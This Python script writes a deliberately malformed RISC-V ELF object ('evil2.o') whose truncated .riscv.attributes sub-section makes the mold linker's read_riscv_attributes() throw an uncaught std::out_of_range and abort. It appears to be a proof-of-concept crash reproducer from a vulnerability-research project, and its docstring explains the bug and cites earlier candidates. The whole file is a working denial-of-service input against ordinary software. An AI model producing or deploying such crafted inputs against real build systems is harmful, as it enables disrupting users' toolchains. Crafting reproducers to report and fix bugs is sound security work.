#!/usr/bin/env python3
"""Second, independent malformed ".riscv.attributes" section, targeting a
DIFFERENT sub-case of the same function (read_riscv_attributes(),
src/input-files.cc): the single-argument, throwing std::string_view::substr(pos)
calls at

    p = p.substr(6);              // skip "riscv\0"
    ...
    p = p.substr(5);               // skip the tag and the sub-sub-section size

If the sub-section's real remaining length after the vendor name is fewer
than 5 bytes, `p.substr(5)` throws std::out_of_range (pos > size()) - mold
has no top-level exception handler anywhere in its input-parsing pipeline,
so this reaches std::terminate() -> SIGABRT. This is the same crash
*mechanism* already confirmed in this project for parse_ehframe()
(candidate 008) and parse_note_gnu_property() (candidate 014): an
untrusted length fed to the throwing single-argument substr(pos) overload.

Here sz is set to a small but internally-CONSISTENT value (no underflow -
sz >= 4, so the sub-case-2 bug above is not the one triggered): the
sub-section is exactly big enough to contain "riscv\0" + the ELF_TAG_FILE
byte, but not the 4-byte sub-sub-section size that p.substr(5) tries to
skip past.
"""
import struct
import sys


def build() -> bytes:
    e_ident = b"\x7fELF" + bytes([2, 1, 1, 0]) + b"\x00" * 8  # ELFCLASS64, ELFDATA2LSB

    # Sub-section content (after the 4-byte sz field): "riscv\0" (6 bytes) + ELF_TAG_FILE
    # (1 byte) = 7 bytes total -> sz = 4 (header) + 7 = 11.
    # After "p = p.substr(6)" (skip "riscv\0"), p has exactly 1 byte left (the
    # ELF_TAG_FILE tag byte) - starts_with(ELF_TAG_FILE) succeeds, but the very next
    # line, "p = p.substr(5)", throws: p.size() == 1 < 5.
    sub_content = b"riscv\x00" + bytes([1])  # ELF_TAG_FILE, nothing after it
    sz = 4 + len(sub_content)
    attr_body = b"A" + struct.pack("<I", sz) + sub_content

    shstrtab = b"\x00.riscv.attributes\x00.shstrtab\x00"
    name_attr = 1
    name_shstrtab = 1 + len(".riscv.attributes") + 1

    off_attr = 64
    off_shstrtab = off_attr + len(attr_body)
    off_shdrs = off_shstrtab + len(shstrtab)
    pad = (-off_shdrs) % 8
    off_shdrs += pad

    SHT_RISCV_ATTRIBUTES = 0x70000003

    ehdr = e_ident + struct.pack(
        "<HHIQQQIHHHHHH",
        1,    # e_type = ET_REL
        243,  # e_machine = EM_RISCV
        1,    # e_version
        0,    # e_entry
        0,    # e_phoff
        off_shdrs,  # e_shoff
        0,    # e_flags
        64,   # e_ehsize
        0,    # e_phentsize
        0,    # e_phnum
        64,   # e_shentsize
        3,    # e_shnum
        2,    # e_shstrndx
    )
    assert len(ehdr) == 64

    def shdr(name, type_, flags, offset, size):
        return struct.pack("<IIQQQQIIQQ", name, type_, flags, 0, offset, size, 0, 0, 1, 0)

    sh_null = shdr(0, 0, 0, 0, 0)
    sh_attr = shdr(name_attr, SHT_RISCV_ATTRIBUTES, 0, off_attr, len(attr_body))
    sh_shstrtab = shdr(name_shstrtab, 3, 0, off_shstrtab, len(shstrtab))  # SHT_STRTAB

    return ehdr + attr_body + shstrtab + b"\x00" * pad + sh_null + sh_attr + sh_shstrtab


def main() -> None:
    out_path = sys.argv[1] if len(sys.argv) > 1 else "evil2.o"
    with open(out_path, "wb") as f:
        f.write(build())


if __name__ == "__main__":
    main()
